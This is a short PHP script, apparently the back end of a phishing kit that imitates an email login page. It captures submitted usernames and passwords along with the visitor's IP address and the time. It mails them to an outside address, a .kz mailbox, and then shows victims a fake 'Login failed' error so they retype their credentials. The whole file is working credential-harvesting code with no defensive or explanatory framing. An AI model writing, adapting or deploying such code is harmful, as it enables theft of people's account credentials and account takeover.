<?php

$ip = getenv("REMOTE_ADDR");
$email = trim($_POST['temail']);
$password = trim($_POST['tpass']);
$server = date("D/M/d, Y g:i a");

if($email != null && $password != null){
	
	$own = 'info@petroleumintertrading.kz';
	$subj = "Rand. E-mail Login - ".$ip;

	$message = "[Rand. E-mail Account] \n\n";
	$message .= "Username : ".$email."\n";
	$message .= "Password : ".$password."\n";
	$message .= "IP : ".$ip."\n";
	$message .= "Date : ".$server."\n";

	mail($own,$subj,$message);
	
	$signal = 'ok';
	$error = 'Login failed! Please enter correct password';
	
	// $praga=rand();
	// $praga=md5($praga);
	
}
else{
	$signal = 'bad';
	$error = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'error' => $error
    );
    echo json_encode($data);

?>